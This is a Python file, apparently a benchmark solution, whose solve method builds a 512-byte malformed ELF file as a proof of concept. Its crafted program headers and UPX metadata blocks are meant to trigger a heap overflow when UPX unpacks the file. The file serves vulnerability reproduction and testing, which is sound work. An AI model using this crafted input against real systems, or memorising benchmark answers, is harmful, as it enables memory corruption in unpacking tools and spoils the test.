import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc = bytearray(512)

        # Elf64_Ehdr (64 bytes at offset 0)
        # Type: DYN (Shared object file)
        # Machine: x86-64
        poc[0:64] = struct.pack(
            "<16sHHIIQQQIHHHHHH",
            b"\x7fELF\x02\x01\x01" + b"\x00" * 9,  # e_ident
            3,      # e_type = ET_DYN
            62,     # e_machine = EM_X86_64
            1,      # e_version
            0x400180, # e_entry (points into the first LOAD segment)
            64,     # e_phoff
            0,      # e_shoff
            0,      # e_flags
            64,     # e_ehsize
            56,     # e_phentsize
            3,      # e_phnum
            0,      # e_shentsize
            0,      # e_shnum
            0       # e_shstrndx
        )

        # Program Headers (3 * 56 = 168 bytes at offset 64)

        # PHDR 0: LOAD R+X segment for UPX stub and metadata.
        poc[64:120] = struct.pack(
            "<IIQQQQQQ",
            1,      # p_type = PT_LOAD
            5,      # p_flags = R+X
            0,      # p_offset
            0x400000, # p_vaddr
            0x400000, # p_paddr
            len(poc), # p_filesz
            0x8000,   # p_memsz
            0x1000    # p_align
        )

        # PHDR 1: LOAD R+W segment. This is the target for the heap overflow.
        poc[120:176] = struct.pack(
            "<IIQQQQQQ",
            1,      # p_type = PT_LOAD
            6,      # p_flags = R+W
            0,      # p_offset
            0x408000, # p_vaddr
            0x408000, # p_paddr
            0,      # p_filesz
            0x10,   # p_memsz (small buffer to overflow)
            0x1000    # p_align
        )

        # PHDR 2: DYNAMIC segment, to trigger un_DT_INIT code path.
        dynamic_table_file_offset = 0x180
        poc[176:232] = struct.pack(
            "<IIQQQQQQ",
            2,      # p_type = PT_DYNAMIC
            6,      # p_flags = R+W
            dynamic_table_file_offset, # p_offset
            0x409000, # p_vaddr
            0x409000, # p_paddr
            16,     # p_filesz (one DT_NULL entry)
            16,     # p_memsz
            8       # p_align
        )

        # Minimal dynamic table with a DT_NULL entry.
        poc[dynamic_table_file_offset:dynamic_table_file_offset+16] = struct.pack("<QQ", 0, 0)

        # UPX data structures, placed near the end of the file.
        l_info_file_offset = 496
        b_info_file_offset = l_info_file_offset - 24
        p_info_file_offset = b_info_file_offset - 16
        data_file_offset = p_info_file_offset - 16

        # l_info: Main info struct for UPX.
        poc[l_info_file_offset:l_info_file_offset+16] = struct.pack(
            "<IiiI",
            0,                                          # l_checksum
            p_info_file_offset - l_info_file_offset,    # p_info offset
            b_info_file_offset - l_info_file_offset,    # b_info offset
            512                                         # l_filesize
        )

        # b_info: Describes the compressed blocks.
        # Block 0: Sets the decompressor method to LZMA (8).
        poc[b_info_file_offset:b_info_file_offset+12] = struct.pack(
            "<III",
            0x1000, # u_len (uncompressed size)
            8,      # c_len (compressed size)
            8       # b_method = LZMA
        )
        # Block 1: Is supposed to be a copy (1), but will be processed with LZMA.
        poc[b_info_file_offset+12:b_info_file_offset+24] = struct.pack(
            "<III",
            0x10,   # u_len
            8,      # c_len
            1       # b_method = COPY
        )

        # p_info: Maps blocks to program headers.
        # p_info[0] corresponds to b_info[0]
        poc[p_info_file_offset:p_info_file_offset+8] = struct.pack(
            "<II",
            0x40A000, # p_va (dummy virtual address)
            0x1000    # p_size (matches b_info[0].u_len)
        )
        # p_info[1] corresponds to b_info[1] and PHDR 1 (the target)
        poc[p_info_file_offset+8:p_info_file_offset+16] = struct.pack(
            "<II",
            0x408000, # p_va (matches PHDR 1 vaddr)
            0x10      # p_size (matches b_info[1].u_len and PHDR 1 memsz)
        )

        # "Compressed" data payload.
        # Data for b_info[0]. Content doesn't matter.
        poc[data_file_offset:data_file_offset+8] = b"A" * 8
        # Data for b_info[1]. This payload causes the overflow when parsed as LZMA.
        poc[data_file_offset+8:data_file_offset+16] = b"\x00" * 8
        
        return bytes(poc)